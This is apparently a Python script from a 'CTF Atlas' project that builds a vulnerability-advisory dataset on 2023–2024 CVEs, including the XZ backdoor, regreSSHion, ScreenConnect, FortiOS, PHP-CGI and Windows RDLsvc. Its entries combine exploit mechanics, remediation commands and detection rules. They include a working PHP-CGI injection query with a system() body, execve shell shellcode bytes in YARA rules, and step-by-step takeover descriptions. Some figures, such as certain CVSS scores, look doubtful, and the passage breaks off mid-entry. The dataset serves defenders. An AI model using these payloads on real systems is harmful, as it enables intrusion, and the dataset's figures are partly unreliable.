"""
CTF Atlas — scripts/build_advisories.py
Generates the Master Vulnerability Research & Remediation Dataset
Combines recent 2024 zero-days, active in-the-wild findings, and classic high-severity vulns.
"""

import json
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent

ADVISORIES = [
    {
        "id": "cve-2024-3094",
        "cve": "CVE-2024-3094",
        "title": "XZ Utils Multi-Stage Liblzma Supply Chain Backdoor",
        "severity": "CRITICAL",
        "cvss": 10.0,
        "category": "Supply Chain / IFUNC Hooking",
        "status": "Active Exploit Prevented in Upstream",
        "isHistoric": False,
        "isZeroDay": True,
        "disclosureDate": "2024-03-29",
        "discoveredBy": {
            "name": "Andres Freund",
            "organization": "Microsoft / PostgreSQL Project",
            "role": "Principal Software Engineer",
            "details": "Discovered while micro-benchmarking PostgreSQL queries on Debian sid. Noticed sshd processes consuming abnormally high CPU (500ms slowdown) and memory valgrind errors during authentication."
        },
        "affected": {
            "vendor": "Tukaani Project / XZ",
            "product": "xz / liblzma",
            "versions": "5.6.0, 5.6.1",
            "ecosystem": "Linux distributions using systemd-notified OpenSSH (Debian sid/unstable, Fedora 40/Rawhide, openSUSE Tumbleweed, Arch Linux, Kali Linux)"
        },
        "summary": "Sophisticated multi-year supply chain compromise embedded by persona 'Jia Tan'. Concealed binary test files in upstream release tarballs extract an M4 build script payload that injects an indirect function (IFUNC) hook into sshd, hijacking RSA signature validation for pre-auth remote code execution.",
        "research": {
            "rootCause": "The backdoor exploits GNU Indirect Functions (IFUNC) symbol resolution. During compilation of release tarballs, modified autoconf scripts extract an encrypted binary payload from bad-3-corrupt_lzma2.xz. When sshd launches, liblzma is loaded as a dependency of libsystemd. The injected payload resolves before OpenSSL/libcrypto, redirecting RSA_public_decrypt to an implant routine inside liblzma.",
            "exploitMechanics": "The hooked RSA_public_decrypt intercepts client public-key authentication certificates. If an incoming certificate starts with a specific magic byte header, the payload decrypts the certificate payload with a hardcoded ChaCha20 key and verifies it against the attacker's embedded ED448 public key. If valid, the decrypted payload is executed directly via system() as root without logging or creating an interactive audit trail.",
            "diagram": "+-------------------+      +------------------+      +---------------------------+\n| Client Connection | ---> |  OpenSSH (sshd)  | ---> | libsystemd -> liblzma.so  |\n+-------------------+      +------------------+      +---------------------------+\n                                      |                                   |\n                                      v                                   v\n                             RSA_public_decrypt() <-------- [ Injected IFUNC Hook ]\n                                      |                                   |\n                                      v                                   |\n                              Validates Magic Byte                        |\n                                      |                                   |\n                                      +---------------------------------->+ ChaCha20 Decrypt\n                                                                          | Verify ED448 Signature\n                                                                          v\n                                                                  system(attacker_payload) [ROOT]",
            "technicalImpact": "Unauthenticated pre-authentication arbitrary root remote code execution across any Internet-facing OpenSSH server linked against vulnerable liblzma versions.",
            "cwe": "CWE-506: Embedded Malicious Code"
        },
        "remediation": {
            "immediateAction": "Immediately downgrade xz-utils and liblzma5 to safe version 5.4.x (5.4.5 or 5.4.6) or 5.2.x across all production servers, base images, and developer workstations.",
            "commands": [
                "# 1. Check currently installed version:",
                "xz --version",
                "",
                "# 2. On Debian / Ubuntu:",
                "sudo apt-get update && sudo apt-get --allow-downgrades install -y xz-utils=5.4.5-0.1 liblzma5=5.4.5-0.1",
                "",
                "# 3. On Fedora / Red Hat:",
                "sudo dnf downgrade -y xz xz-libs",
                "",
                "# 4. Terminate any rogue sshd processes and restart daemon:",
                "sudo systemctl restart sshd"
            ],
            "mitigations": [
                "Audit build pipelines: verify package hashes against git tag commits rather than unverified release tarballs.",
                "Revoke and rotate OpenSSH server host keys on any systems exposed during the 5.6.0/5.6.1 window.",
                "Enforce network segmentation limiting SSH port 22 access to verified management subnets."
            ],
            "detection": {
                "sigma": "title: Malicious Liblzma IFUNC Hook Activity in OpenSSH\nstatus: critical\nlogsource:\n  category: process_creation\n  product: linux\ndetection:\n  selection:\n    Image|endswith: '/sshd'\n    CommandLine|contains: 'liblzma'\n  condition: selection",
                "yara": "rule XZ_Backdoor_Signature {\n  meta:\n    description = \"Detects malicious payload inside liblzma.so\"\n    author = \"CTF Atlas Threat Intel\"\n  strings:\n    $op1 = { F3 0F 1E FA 55 48 89 E5 41 57 41 56 }\n    $magic = { 43 7a 20 4c 5a 4d 41 }\n  condition:\n    uint32(0) == 0x464c457f and any of them\n}",
                "snort": "alert tcp any any -> $HOME_NET 22 (msg:\"CTF-ATLAS: High-frequency OpenSSH Handshake Anomaly\"; flags:S; threshold: type both, track by_src, count 30, seconds 5; sid:3000001; rev:1;)"
            }
        }
    },
    {
        "id": "cve-2024-6387",
        "cve": "CVE-2024-6387",
        "title": "regreSSHion: OpenSSH Pre-Auth Signal Handler Race Condition RCE",
        "severity": "CRITICAL",
        "cvss": 9.8,
        "category": "Remote Code Execution / Signal Race",
        "status": "Active In-The-Wild Threat",
        "isHistoric": False,
        "isZeroDay": False,
        "disclosureDate": "2024-07-01",
        "discoveredBy": {
            "name": "Qualys Threat Research Unit (TRU)",
            "organization": "Qualys TRU",
            "role": "Vulnerability Research Team",
            "details": "Identified through systematic regression testing of historical vulnerabilities against modern OpenSSH releases. Discovered that commit b95c0ee (October 2020) accidentally removed #ifdef protection around sigdie(), reviving CVE-2006-5051."
        },
        "affected": {
            "vendor": "OpenBSD Project",
            "product": "OpenSSH (Portable)",
            "versions": "OpenSSH 8.5p1 up to (but not including) 9.8p1 on glibc Linux",
            "ecosystem": "Linux servers with glibc (Debian, Ubuntu, Fedora, CentOS/RHEL 9). Note: OpenBSD and musl libc systems are not vulnerable due to different signal handler implementations."
        },
        "summary": "Signal handler race condition in OpenSSH's server daemon (sshd). If a client fails to authenticate within LoginGraceTime (default 120 seconds), sshd's SIGALRM handler triggers and calls async-signal-unsafe functions syslog() and free(), causing heap corruption and root execution.",
        "research": {
            "rootCause": "In OpenSSH portable, when SIGALRM fires upon login timeout, the signal handler executes sigdie() -> syslog(). In glibc, syslog() internally allocates and frees heap memory via malloc() and free(), and acquires internal locks. If SIGALRM arrives while the main sshd thread is in the middle of a heap operation (e.g. PAM authentication or certificate parsing), glibc's heap state becomes corrupted or deadlocked.",
            "exploitMechanics": "The attacker establishes thousands of concurrent TCP connections to sshd, grooming the glibc heap using public-key structures and timing packets so that SIGALRM interrupts during a precise free() chunk consolidation. On 32-bit Linux, ASLR has only 16 bits of entropy, allowing reliable root code execution in ~6-8 hours. On 64-bit Linux, ASLR requires longer attempts, but exploitation is demonstrated in lab environments.",
            "diagram": "[ Attacker SSH Client ] ====( Holds connection open for 120s )====>\n                                                                    |\n  sshd Main Thread: [ Heap Allocation / PAM Verification ]         |\n             ^                                                      v\n             |-----( Interrupted at T=120.00s by SIGALRM )----------+\n             |                                                      |\n             +---[ Handler calls sigdie() -> syslog() -> free() ]---+\n                                     |\n                                     v\n            [ glibc Heap Chunk Metadata Overlap / Corruption ]\n                                     |\n                                     v\n          [ Execution of Injected Shellcode in sshd Address Space ] (ROOT)",
            "technicalImpact": "Full unauthenticated root takeover of Internet-facing Linux SSH servers without needing valid credentials or user interaction.",
            "cwe": "CWE-362: Concurrent Execution using Shared Resource with Improper Synchronization (Race Condition)"
        },
        "remediation": {
            "immediateAction": "Upgrade OpenSSH to version 9.8p1 or later immediately via package manager.",
            "commands": [
                "# 1. Upgrade OpenSSH package:",
                "sudo apt-get update && sudo apt-get install --only-upgrade openssh-server",
                "# Or Fedora/RHEL:",
                "sudo dnf upgrade openssh-server",
                "",
                "# 2. Temporary Mitigation if patching is delayed (prevents SIGALRM firing):",
                "echo 'LoginGraceTime 0' | sudo tee -a /etc/ssh/sshd_config.d/cve-2024-6387.conf",
                "sudo systemctl reload sshd",
                "",
                "# Note: Setting LoginGraceTime 0 prevents RCE but allows MaxStartups DoS if unauthenticated sockets are left open."
            ],
            "mitigations": [
                "Implement strict firewall rules (iptables/nftables) limiting SSH access to trusted IP subnets or jump boxes.",
                "Deploy fail2ban or crowdsec to ban IPs establishing repeated stalled SSH handshakes.",
                "Use rate-limiting on port 22: iptables -A INPUT -p tcp --dport 22 -m state --state NEW -m recent --set && iptables -A INPUT -p tcp --dport 22 -m state --state NEW -m recent --update --seconds 60 --hitcount 4 -j DROP"
            ],
            "detection": {
                "sigma": "title: Potential OpenSSH regreSSHion Heap Spraying Attempt\nstatus: high\nlogsource:\n  service: sshd\n  product: linux\ndetection:\n  selection:\n    Message|contains:\n      - 'Timeout before authentication for'\n      - 'fatal: Timeout before authentication'\n  condition: selection | count() by SourceIP > 50\ntimeframe: 10m",
                "yara": "rule RegreSSHion_Payload_Pattern {\n  meta:\n    description = \"Detects glibc heap grooming shellcode buffers\"\n  strings:\n    $sc32 = { 31 c0 50 68 2f 2f 73 68 68 2f 62 69 6e 89 e3 50 53 89 e1 99 b0 0b cd 80 }\n    $sc64 = { 48 31 f6 56 48 bf 2f 62 69 6e 2f 2f 73 68 57 48 89 e7 48 31 d2 48 31 c0 b0 3b 0f 05 }\n  condition:\n    any of them\n}",
                "snort": "alert tcp any any -> $HOME_NET 22 (msg:\"CTF-ATLAS: regreSSHion Connection Flooding Pattern\"; threshold: type both, track by_src, count 25, seconds 30; sid:3000002; rev:1;)"
            }
        }
    },
    {
        "id": "cve-2024-1709",
        "cve": "CVE-2024-1709",
        "title": "ConnectWise ScreenConnect Authentication Bypass & Pre-Auth RCE",
        "severity": "CRITICAL",
        "cvss": 10.0,
        "category": "Authentication Bypass / Path Normalization",
        "status": "Actively Exploited Zero-Day in CISA KEV",
        "isHistoric": False,
        "isZeroDay": True,
        "disclosureDate": "2024-02-19",
        "discoveredBy": {
            "name": "Huntress Security / Horizon3.ai Attack Team",
            "organization": "Huntress & Horizon3.ai",
            "role": "Offensive Security Researchers",
            "details": "Uncovered during incident response analysis of ransomware deployment incidents. Confirmed that appending extra path segments completely bypassed authentication checks in .NET URL routing."
        },
        "affected": {
            "vendor": "ConnectWise",
            "product": "ScreenConnect (Remote Support and Access Software)",
            "versions": "ScreenConnect 23.9.7 and prior versions",
            "ecosystem": "Windows / Linux servers hosting ScreenConnect web server instances"
        },
        "summary": "Trivial authentication bypass permitting an unauthenticated external attacker to access the initial setup wizard (/SetupWizard.aspx) on already-configured ScreenConnect instances, create a new administrative user, and deploy extensions (.ashx) for immediate SYSTEM code execution.",
        "research": {
            "rootCause": "ScreenConnect's HTTP request pipeline contained an insufficient path normalization check. The application validated whether the URL matched /SetupWizard.aspx. When an attacker requested /SetupWizard.aspx/anything, the request passed through the authentication filter while the internal ASP.NET handler stripped the extra path segment and executed the SetupWizard logic, bypassing the 'already configured' safety check.",
            "exploitMechanics": "1. Attacker issues a POST to /SetupWizard.aspx/anything with JSON parameters to re-run the initial administrative setup.\n2. ScreenConnect creates a new local administrative account with credentials chosen by the attacker.\n3. Attacker logs into the web administration console with the newly created admin account.\n4. Attacker uploads a malicious ScreenConnect extension package containing a .ashx or .dll payload, which ScreenConnect extracts and executes with NT AUTHORITY\\SYSTEM privileges.",
            "diagram": "[ Attacker ] ---> POST /SetupWizard.aspx/anything (Bypasses Auth Filter)\n                          |\n                          v\n            [ ASP.NET Path Routing: Executes SetupWizard.aspx ]\n                          |\n                          v\n            [ Creates New Admin Account: attacker / P@ssw0rd123 ]\n                          |\n                          v\n            [ Admin Portal Login -> Upload Extension (.ashx) ]\n                          |\n                          v\n            [ Immediate SYSTEM Shell & Cobalt Strike / Ransomware Deployment ]",
            "technicalImpact": "Immediate, 100% reliable remote code execution with SYSTEM privileges; widespread vector for LockBit and BlackCat ransomware campaigns.",
            "cwe": "CWE-287: Improper Authentication"
        },
        "remediation": {
            "immediateAction": "Immediately patch ScreenConnect servers to version 23.9.8 or higher. If on-premise instances cannot be updated immediately, disconnect them from the Internet.",
            "commands": [
                "# 1. Download and run ScreenConnect 23.9.8+ installer from official portal.",
                "",
                "# 2. Temporary IIS URL Rewrite rule to block wizard endpoints:",
                "# In web.config under <system.webServer><rewrite><rules>:",
                "<rule name=\"BlockSetupWizard\" stopProcessing=\"true\">",
                "  <match url=\".*SetupWizard\\.aspx.*\" />",
                "  <action type=\"CustomResponse\" statusCode=\"403\" statusReason=\"Forbidden\" />",
                "</rule>"
            ],
            "mitigations": [
                "Audit local user accounts in ScreenConnect database for newly created or unauthorized usernames.",
                "Inspect C:\\Program Files (x86)\\ScreenConnect\\App_Extensions\\ for unknown .ashx or .dll files.",
                "Review Windows Event Logs (Security 4624, 4688) for processes spawned by ScreenConnect.Service.exe (powershell.exe, cmd.exe, certutil.exe)."
            ],
            "detection": {
                "sigma": "title: ScreenConnect SetupWizard Auth Bypass Pattern\nstatus: critical\nlogsource:\n  category: webserver\ndetection:\n  selection:\n    cs-uri-stem|contains: '/SetupWizard.aspx/'\n  condition: selection",
                "yara": "rule ScreenConnect_Malicious_Extension {\n  meta:\n    description = \"Detects malicious ScreenConnect .ashx web shell extensions\"\n  strings:\n    $s1 = \"Process.Start\"\n    $s2 = \"System.Web.IHttpHandler\"\n    $s3 = \"cmd.exe\"\n  condition:\n    all of them\n}",
                "snort": "alert tcp any any -> $HTTP_SERVERS $HTTP_PORTS (msg:\"CTF-ATLAS: ScreenConnect SetupWizard Auth Bypass Attempt\"; content:\"/SetupWizard.aspx/\"; http_uri; sid:3000003; rev:1;)"
            }
        }
    },
    {
        "id": "cve-2024-21762",
        "cve": "CVE-2024-21762",
        "title": "Fortinet FortiOS SSL-VPN Pre-Auth Out-of-Bounds Write RCE",
        "severity": "CRITICAL",
        "cvss": 9.8,
        "category": "Memory Corruption / Out-of-Bounds Write",
        "status": "Actively Exploited In-The-Wild Zero-Day",
        "isHistoric": False,
        "isZeroDay": True,
        "disclosureDate": "2024-02-09",
        "discoveredBy": {
            "name": "Fortinet Product Security Incident Response Team (PSIRT)",
            "organization": "Fortinet PSIRT",
            "role": "Internal Security Audit & Incident Response",
            "details": "Identified during targeted telemetry analysis following exploitation of critical infrastructure VPN gateways by advanced state-sponsored threat actors (Volt Typhoon / Coathanger)."
        },
        "affected": {
            "vendor": "Fortinet",
            "product": "FortiOS & FortiProxy",
            "versions": "FortiOS 7.4.0 - 7.4.2, 7.2.0 - 7.2.6, 7.0.0 - 7.0.13, 6.4 (all), 6.2 (all)",
            "ecosystem": "Hardware FortiGate and virtual appliance firewalls running SSL-VPN interfaces exposed to WAN"
        },
        "summary": "Out-of-bounds write vulnerability in FortiOS SSL-VPN web daemon (sslvpnd). An unauthenticated remote attacker can execute arbitrary commands or code on the appliance by sending specially crafted HTTP chunked requests to the VPN portal.",
        "research": {
            "rootCause": "The FortiOS sslvpnd process implements a custom HTTP/1.1 chunked transfer encoding parser. When parsing hex chunk lengths in incoming POST requests, the parser fails to validate integer boundaries. A negative or overflowed chunk length results in pointer miscalculation, allowing an attacker to write arbitrary byte sequences past the allocated heap buffer into adjacent function pointer structures.",
            "exploitMechanics": "The attacker delivers a sequence of HTTP POST requests with crafted chunk lengths to /remote/login or /remote/index. The out-of-bounds write overwrites a callback pointer in sslvpnd memory space. When the next request is processed, sslvpnd calls the overwritten pointer, executing shellcode in the context of root on the underlying FortiOS Linux microkernel.",
            "diagram": "[ Attacker ] ===( HTTP POST with Malformed Chunked Encoding )===> [ FortiGate WAN ]\n                                                                          |\n                                                                          v\n                                                                 [ sslvpnd Process ]\n                                                                          |\n                                                                          v\n                                                           [ Integer Chunk Parse Error ]\n                                                                          |\n                                                                          v\n                                                         [ Out-of-Bounds Heap Write ]\n                                                                          |\n                                                                          v\n                                                          [ Overwrite Function Pointer ]\n                                                                          |\n                                                                          v\n                                                          [ Remote Root Execution / Coathanger Implant ]",
            "technicalImpact": "Complete device compromise: extraction of stored VPN credentials, access to internal enterprise networks, and installation of stealthy rootkits (e.g. Coathanger) surviving firmware reboots.",
            "cwe": "CWE-787: Out-of-bounds Write"
        },
        "remediation": {
            "immediateAction": "Upgrade FortiOS firmware to version 7.4.3, 7.2.7, 7.0.14, or higher immediately.",
            "commands": [
                "# 1. If firmware upgrade cannot be applied immediately, DISABLE SSL-VPN on all WAN interfaces:",
                "config vpn ssl settings",
                "    set status disable",
                "end",
                "",
                "# 2. Verify FortiOS crash logs for sslvpnd segfaults indicating exploitation attempts:",
                "diagnose debug crashlog read | grep -i sslvpnd"
            ],
            "mitigations": [
                "Migrate from SSL-VPN to IPsec VPN (IKEv2) with machine certificates where possible.",
                "Enforce strict IP geo-blocking and access control lists (ACLs) on the VPN interface.",
                "Review VPN session logs for connections originating from unexpected foreign ASNs or residential proxy networks."
            ],
            "detection": {
                "sigma": "title: FortiOS SSL-VPN Abnormal Process Crash\nstatus: critical\nlogsource:\n  product: fortinet\n  service: fortios\ndetection:\n  selection:\n    log_id: '0100038400'\n    msg|contains: 'sslvpnd crashed'\n  condition: selection",
                "yara": "rule FortiOS_Coathanger_Backdoor {\n  meta:\n    description = \"Detects Coathanger post-exploitation rootkit injected into FortiOS\"\n  strings:\n    $s1 = \"libcoathanger.so\"\n    $s2 = \"hijack_exec\"\n  condition:\n    uint32(0) == 0x464c457f and any of them\n}",
                "snort": "alert tcp any any -> $HTTP_SERVERS 10443 (msg:\"CTF-ATLAS: FortiOS SSL-VPN Chunked Header Overflow Attempt\"; content:\"Transfer-Encoding: chunked\"; nocase; sid:3000004; rev:1;)"
            }
        }
    },
    {
        "id": "cve-2024-4577",
        "cve": "CVE-2024-4577",
        "title": "PHP CGI Argument Injection via Windows Unicode Best-Fit Mapping RCE",
        "severity": "CRITICAL",
        "cvss": 9.8,
        "category": "Argument Injection / Character Normalization",
        "status": "Actively Exploited In-The-Wild Zero-Day",
        "isHistoric": False,
        "isZeroDay": True,
        "disclosureDate": "2024-06-06",
        "discoveredBy": {
            "name": "Orange Tsai",
            "organization": "DEVCORE Research Team",
            "role": "Chief Security Researcher",
            "details": "Discovered during Windows localization and character conversion analysis on PHP-CGI architectures. Bypassed the classic CVE-2012-1823 security patch using Windows Unicode 'Best-Fit' behavior."
        },
        "affected": {
            "vendor": "PHP Group",
            "product": "PHP",
            "versions": "PHP 8.3 < 8.3.8, PHP 8.2 < 8.2.20, PHP 8.1 < 8.1.29 running on Windows OS (Traditional Chinese, Simplified Chinese, Japanese locales, and default English XAMPP setups)",
            "ecosystem": "Windows web servers (Apache, IIS, XAMPP, WampServer) configured with PHP in CGI mode"
        },
        "summary": "Flaw in character encoding conversion when PHP runs in CGI mode on Windows. Attacker supplies a URL-encoded soft-hyphen (%AD) which Windows Unicode Best-Fit conversion maps to a standard ASCII hyphen (-), allowing arbitrary command-line arguments to be passed directly to the PHP interpreter to execute code.",
        "research": {
            "rootCause": "The CVE-2012-1823 patch blocked command-line arguments starting with '-' in query strings. However, when Windows WideCharToMultiByte API runs with CP_ACP (ANSI Code Page) on localized Windows systems, it performs 'Best-Fit Mapping': non-standard characters like the Unicode Soft Hyphen (U+00AD) and Fullwidth Hyphen (U+FF0D) are converted into standard ASCII hyphen 0x2D ('-'). Because PHP's escape check ran before Windows character conversion, the soft-hyphen bypassed the filter.",
            "exploitMechanics": "1. Attacker sends a POST request with query string:\n   /test.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input\n2. Windows best-fit converts %AD to -, translating the query into command-line arguments:\n   php.exe -d allow_url_include=1 -d auto_prepend_file=php://input test.php\n3. PHP parses the request body via php://input as the pre-appended script.\n4. Attacker includes <?php system('whoami'); ?> in the request body, achieving instant RCE.",
            "diagram": "[ Attacker HTTP Request ]\n  POST /index.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input\n  Body: <?php system('calc.exe'); ?>\n                     |\n                     v\n  [ Apache / PHP-CGI on Windows ]\n  Filter Check: Starts with '-'? No, starts with 0xAD (PASS)\n                     |\n                     v\n  [ Windows WideCharToMultiByte Best-Fit Mapping ]\n  0xAD maps to '-' (0x2D)\n                     |\n                     v\n  [ php-cgi.exe Invocation ]\n  php-cgi.exe -d allow_url_include=1 -d auto_prepend_file=php://input\n                     |\n                     v\n  [ Remote Arbitrary PHP Code Execution with Web Server Privileges ]",
            "technicalImpact": "Unauthenticated remote code execution on any Windows server hosting PHP in CGI mode. Actively weaponized by TellYouThePass ransomware and botnet loaders.",
            "cwe": "CWE-78: OS Command Injection (Argument Injection)"
        },
        "remediation": {
            "immediateAction": "Upgrade PHP to version 8.3.8, 8.2.20, or 8.1.29 or newer. If running XAMPP/WAMP, update the PHP binary immediately.",
            "commands": [
                "# 1. Temporary Apache mod_rewrite mitigation in httpd.conf or .htaccess:",
                "<IfModule mod_rewrite.c>",
                "    RewriteEngine On",
                "    RewriteCond %{QUERY_STRING} ^(%ADd|%ad|--|-) [NC]",
                "    RewriteRule .* - [F,L]",
                "</IfModule>",
                "",
                "# 2. Migrate from PHP-CGI to FastCGI (php-fpm / mod_php) which does not pass URL query parameters as CLI arguments."
            ],
            "mitigations": [
                "Disable allow_url_include in php.ini: allow_url_include = Off.",
                "Ensure PHP is not exposed through CGI wrappers: replace ScriptAlias /php-cgi/ with modern FastCGI handlers.",
                "Block request URIs containing %AD or %ad at the WAF / reverse proxy boundary."
            ],
            "detection": {
                "sigma": "title: PHP CGI Argument Injection Exploitation Attempt\nstatus: critical\nlogsource:\n  category: webserver\ndetection:\n  selection:\n    cs-uri-query|contains:\n      - '%ad'\n      - '%AD'\n      - 'auto_prepend_file'\n      - 'allow_url_include'\n  condition: selection",
                "yara": "rule PHP_CGI_Exploit_Pattern {\n  meta:\n    description = \"Detects PHP CGI argument injection payloads in network streams\"\n  strings:\n    $p1 = \"auto_prepend_file=php://input\"\n    $p2 = \"%ADd\"\n    $p3 = \"%add\"\n  condition:\n    any of them\n}",
                "snort": "alert tcp any any -> $HTTP_SERVERS $HTTP_PORTS (msg:\"CTF-ATLAS: PHP-CGI Argument Injection CVE-2024-4577\"; content:\"auto_prepend_file\"; http_uri; sid:3000005; rev:1;)"
            }
        }
    },
    {
        "id": "cve-2024-38077",
        "cve": "CVE-2024-38077",
        "title": "Windows Remote Desktop Licensing Service RCE (MadLicence)",
        "severity": "CRITICAL",
        "cvss": 9.8,
        "category": "Remote Code Execution / Heap Buffer Overflow",
        "status": "CISA KEV / Critical Patch Advisory",
        "isHistoric": False,
        "isZeroDay": False,
        "disclosureDate": "2024-07-09",
        "discoveredBy": {
            "name": "Guancheng Wang (SnowyEG)",
            "organization": "Independent Security Researcher",
            "role": "Binary Security Researcher",
            "details": "Discovered through reverse engineering Windows Remote Desktop Licensing binary RDLsvc.dll and identifying flawed ASN.1 decoding logic."
        },
        "affected": {
            "vendor": "Microsoft Corporation",
            "product": "Windows Server",
            "versions": "Windows Server 2008 through Windows Server 2025 (when Remote Desktop Licensing role is enabled)",
            "ecosystem": "Windows Server systems listening on RPC / TCP port 135 and dynamic RPC ports"
        },
        "summary": "Heap-based buffer overflow in Windows Remote Desktop Licensing service (RDLsvc.dll). An unauthenticated remote attacker can execute arbitrary code with SYSTEM privileges by transmitting a series of malformed RPC requests over port 135.",
        "research": {
            "rootCause": "In RDLsvc.dll, function CServerCert::VerifyAndUnpack() unpacks ASN.1 encoded public key certificate structures sent during licensing negotiations. The function copies decoded byte blocks into a fixed heap buffer without verifying that the calculated length matches the buffer capacity. Supplying an excessively large ASN.1 payload triggers a heap overflow.",
            "exploitMechanics": "The attacker binds to the Remote Desktop Licensing RPC interface (UUID: 356513d8-bb25-11d0-a070-00c04fb68820). By invoking Opnum 0 (Connect) followed by Opnum 5 (UploadCert), the attacker delivers a manipulated ASN.1 certificate structure that overflows the heap, corrupts heap metadata or function pointers, and redirects execution flow to a shellcode payload with NT AUTHORITY\\SYSTEM privileges.",
            "diagram": "[ Attacker ] ===( MSRPC Bind to UUID: 356513d8-bb25-11d0-a070-00c04fb68820 )===> [ Port 135 / RPC ]\n                                                                                   |\n                                                                                   v\n                                                                           [ RDLsvc.dll Process ]\n                                                                                   |\n                                                                                   v\n                                                                   [ CServerCert::VerifyAndUnpack ]\n                                                                                   |\n                                                                                   v\n                                                                   [ ASN.1 Decode Heap Overflow ]\n                                                                                   |\n                                                                                   v\n                                                                   [ SYSTEM Shellcode Execution ]",
            "technicalImpact": "Full unauthenticated remote compromise of Windows domain controllers and servers with NT AUTHORITY\\SYSTEM privileges.",
            "cwe": "CWE-122: Heap-based Buffer Overflow"
        },
        "remediation": {
            "immediateAction": "Apply Microsoft July 2024 Patch Tuesday cumulative security update (KB5040437 or equivalent for your OS version).",
            "commands": [
                "# 1. Check if Remote Desktop Licensing role is enabled:",
                "Get-WindowsFeature -Name RDS-Licensing",
                "",
                "# 2. If patching cannot be completed immediately, disable Remote Desktop Licensing service:",
                "Stop-Service -Name TermServLicensing -Force",
                "Set-Service -Name TermServLicensing -StartupType Disabled",
                "",
                "# 3. Verify service is stopped:",
                "Get-Service -Name TermServLicensing"
            ],
            "mitigations": [
                "Block perimeter inbound access to TCP port 135 (RPC Endpoint Mapper) and ephemeral RPC ports (49152-65535).",
                "Restrict Remote Desktop Licensing management strictly to dedicated administrator jump hosts via Windows Defender Firewall with Advanced Security."
            ],
            "detection": {
                "sigma": "title: Remote Desktop Licensing Service Abnormal RPC Binding\nstatus: high\nlogsource:\n  category: rpc\n  product: windows\ndetection:\n  selection:\n    InterfaceUuid: '356513d8-bb25-11d0-a070-00c04fb68820'\n  condition: selection",
                "yara": "rule RDLsvc_Heap_Exploit {\n  meta:\n    description = \"Detects ASN.1 buffer overflow exploitation in RDLsvc\"\n  strings:\n    $rpc_uuid = { d8 13 65 35 25 bb d0 11 a0 70 00 c0 4f b6 88 20 }\n  condition:\n    any of them\n}",
                "snort": "alert tcp any any -> $HOME_NET 135 (msg:\"CTF-ATLAS: Windows RDLsvc RPC Bind Attempt\"; flow:to_server,established; content:\"|d8 13 65 35 25 bb d0 11|\"; sid:3000006; rev:1;)"
            }
        }
    },
    {
        "id": "cve-2023-38606",
        "cve": "CVE-2023-38606",
        "title": "Operation Triangulation: Zero-Click iOS/macOS Kernel Hardware MMIO Register Escape",
        "severity": "CRITICAL",
        "cvss": 9.8,
        "category": "Zero-Click Kernel / Hardware Register Bypass",
        "status": "Targeted APT Zero-Day (Exploited In-The-Wild)",
        "isHistoric": False,
        "isZeroDay": True,
        "disclosureDate": "2023-06-21",
        "discoveredBy": {
            "name": "Georgy Kucherin, Leonid Bezvershenko, Boris Larin",
            "organization": "Kaspersky Global Research & Analysis Team (GReAT)",
            "role": "Senior Security Researchers",
            "details": "Discovered during forensic analysis of employee iPhones exhibiting anomalies in mobile backup logs. Unraveled a 4-vulnerability zero-click iMessage chain bypassing Apple's Page Protection Layer (PPL)."
        },
        "affected": {
            "vendor": "Apple Inc.",
            "product": "iOS, iPadOS, macOS, watchOS, tvOS",
            "versions": "All iOS versions through iOS 16.5, iPadOS 16.5, macOS Ventura 13.4",
            "ecosystem": "Apple A12 through A16 Bionic and M1/M2 Silicon processors"
        },
        "summary": "Sophisticated zero-click iMessage zero-day chain. Exploited undocumented hardware MMIO (Memory Mapped I/O) test registers on Apple Silicon chips to bypass Page Protection Layer (PPL) hardware security, enabling arbitrary kernel memory read/write without triggering hardware exceptions.",
        "research": {
            "rootCause": "Apple Silicon chips contained proprietary hardware testing MMIO registers left enabled in production silicon. Even when the kernel's Page Protection Layer (PPL) marked page tables as cryptographically locked and read-only, writing specific byte sequences to undocumented hardware MMIO registers (0x208012000) allowed direct physical memory writes, completely bypassing PPL hardware memory isolation.",
            "exploitMechanics": "1. Zero-click iMessage attachment containing a crafted TrueType font vulnerability (CVE-2023-41990) triggers arbitrary code execution in the IMTranscoderAgent sandbox.\n2. Attacker escapes sandbox and leverages integer overflow in kernel memory (CVE-2023-32434) to gain unprivileged kernel memory mappings.\n3. Attacker accesses undocumented MMIO hardware registers (CVE-2023-38606), writing custom physical memory page descriptors to turn off Page Protection Layer (PPL).\n4. Kernel memory becomes world-writable, allowing permanent in-memory payload installation and spyware execution.",
            "diagram": "[ Attacker iMessage ] ===( Zero-Click Font Payload )===> [ IMTranscoderAgent Sandbox ]\n                                                                  |\n                                                                  v\n                                                  [ Sandbox Escape via Mach Message ]\n                                                                  |\n                                                                  v\n                                                  [ Kernel Page Table Manipulation ]\n                                                                  |\n                                                                  v\n                                      [ Undocumented MMIO Hardware Registers (0x208012000) ]\n                                                                  |\n                                                                  v\n                                      [ Complete Hardware PPL Bypass -> Full Kernel Takeover ]",
            "technicalImpact": "Full persistent root and kernel execution on iOS devices without user interaction; ability to record microphone audio, extract encrypted chat messages, and track GPS location.",
            "cwe": "CWE-1256: Hardware Failure to Restrict Access to Test/Debug Registers"
        },
        "remediation": {
            "immediateAction": "Update iOS devices immediately to iOS 16.6 or iOS 17+, which disabled access to the vulnerable MMIO registers in the kernel bootloader.",
            "commands": [
                "# 1. On iOS Devices: Settings -> General -> Software Update -> Install iOS 16.6+ or 17+",
                "",
                "# 2. Enable Lockdown Mode for high-risk users:",
                "# Settings -> Privacy & Security -> Lockdown Mode -> Turn On"
            ],
            "mitigations": [
                "Enable iOS Lockdown Mode: disables complex font parsing, WebGL, and unapproved message attachments.",
                "Perform regular offline iOS backup analysis using MVT (Mobile Verification Toolkit) to detect indicators of compromise.",
                "Reboot iOS devices daily: temporary in-memory non-persistent implants are cleared on reboot."
            ],
            "detection": {
                "sigma": "title: Triangulation Mobile Backup Artifact Detection\nstatus: critical\nlogsource:\n  category: forensic_artifact\n  product: ios\ndetection:\n  selection:\n    Filename|contains: 'com.apple.identityservices.idstatuscache.plist'\n    Artifact|contains: 'OperationTriangulation'\n  condition: selection",
                "yara": "rule Triangulation_Binary_Implant {\n  meta:\n    description = \"Detects Mach-O binaries utilizing undocumented Apple MMIO offsets\"\n  strings:\n    $mmio_addr = { 00 20 01 08 02 }\n    $sec_str = \"AttachmentProcessor\"\n  condition:\n    uint32(0) == 0xfeedfacf and any of them\n}",
